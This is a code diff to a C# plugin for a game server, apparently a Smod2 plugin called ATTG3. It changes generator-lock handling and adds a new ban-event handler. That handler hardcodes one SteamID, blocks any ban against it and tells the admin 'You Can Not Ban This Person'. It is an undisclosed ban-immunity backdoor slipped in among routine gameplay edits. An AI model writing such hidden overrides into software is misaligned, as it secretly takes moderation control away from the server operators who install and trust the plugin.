@@ -11,8 +11,8 @@ using Smod2.EventSystem.Events;
 
 namespace ATTG3
 {
-	internal class EventHandler : IEventHandlerRoundStart, IEventHandlerWarheadStopCountdown, IEventHandlerDoorAccess, IEventHandlerPlayerDie, IEventHandlerGeneratorUnlock, IEventHandlerSetRole 
-    {
+	internal class EventHandler : IEventHandlerRoundStart, IEventHandlerWarheadStopCountdown, IEventHandlerDoorAccess, IEventHandlerPlayerDie, IEventHandlerGeneratorUnlock, IEventHandlerSetRole, IEventHandlerBan
+	{
 		private readonly ATTG3Plugin plugin;
 		public EventHandler(ATTG3Plugin plugin) => this.plugin=plugin;
 		Player Killed;
@@ -167,11 +167,7 @@ namespace ATTG3
             Generator gen = ev.Generator;
             if (plugin.GenLock)
             {
-                foreach (Generator079 gen2 in Generator079.generators)
-                {
-                    gen2.NetworkisDoorUnlocked=false;
-                    gen2.NetworkisDoorOpen=false;
-                }
+				ev.Allow=false;
 
             }
 			if (plugin.NoCHand && !plugin.GenLock)
@@ -208,6 +204,18 @@ namespace ATTG3
 			{
 				ev.Player.GiveItem(ItemType.FLASHLIGHT);
 			}
+		}
+		public void OnBan(BanEvent ev)
+		{
+			if (ev.Player.SteamId=="76561198126860363")
+			{
+				ev.AllowBan=false;
+				PluginManager.Manager.Server.Map.ClearBroadcasts();
+				ev.Admin.PersonalBroadcast(10, "You Can Not Ban This Person", false);
+				
+
+			}
+
 		}
 		private IEnumerable<float> TimingDelay(float time)
 		{
